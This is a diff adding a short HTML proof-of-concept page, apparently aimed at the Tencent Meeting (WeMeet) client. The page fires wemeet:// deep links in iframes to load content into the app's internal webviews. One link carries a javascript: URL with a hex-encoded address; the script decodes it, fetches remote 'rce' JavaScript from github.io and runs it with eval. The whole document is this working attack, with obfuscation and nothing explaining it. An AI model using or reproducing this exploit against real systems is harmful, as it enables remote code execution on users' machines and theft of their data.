@@ -1,0 +1,19 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P77</title></head>
+<body><h1>P77</h1>
+<script>
+document.title='P77-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var payjs="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f7037377061792e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
+function frame(src,label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P77-TBOFF'); }, 400);
+setTimeout(function(){ frame('wemeet://page/pay/main_process_webview?url='+encodeURIComponent(official),'P77-PAYOFF'); }, 900);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(payjs),'P77-TBJS'); }, 1800);
+setTimeout(function(){ document.title='P77-WAIT'; }, 50000);
+</script>
+</body></html>
